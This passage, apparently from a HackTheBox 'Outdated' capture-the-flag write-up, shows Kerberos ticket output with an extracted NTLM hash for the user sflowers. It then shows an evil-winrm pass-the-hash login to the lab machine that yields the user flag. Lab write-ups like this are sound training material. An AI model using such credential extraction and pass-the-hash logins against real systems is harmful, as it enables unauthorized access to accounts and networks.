              NDRaqA4bDE9VVERBVEVELkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMb3V0ZGF0ZWQuaHRi
        
          ServiceName              :  krbtgt/outdated.htb
          ServiceRealm             :  OUTDATED.HTB
          UserName                 :  sflowers
          UserRealm                :  OUTDATED.HTB
          StartTime                :  12/20/2022 11:05:44 PM
          EndTime                  :  12/21/2022 9:05:44 AM
          RenewTill                :  12/27/2022 11:05:44 PM
          Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
          KeyType                  :  rc4_hmac
          Base64(key)              :  rLrBAoPcu4HNDEhx9kLHlQ==
          ASREP (key)              :  2E6385ECFA5C3F9D58D7A4EE9B9C29EA
        
        [*] Getting credentials using U2U
        
          CredentialInfo         :
            Version              : 0
            EncryptionType       : rc4_hmac
            CredentialData       :
              CredentialCount    : 1
               NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5     
               
![image](https://user-images.githubusercontent.com/87700008/208783652-f6df176f-091d-4775-abd3-61d167b07350.png)

Used that gathered NTLM hash to log-in via evil-winrm & logged-in successfully as "sflowers", also got the user flag here as well:

        evil-winrm -i 10.10.11.175 -u sflowers -H '1FCDB1F6015DCB318CC77BB2BDA14DB5'
       
![image](https://user-images.githubusercontent.com/87700008/208784059-0c780be3-98fe-44ad-8d4a-7c9a3bb1cd33.png)
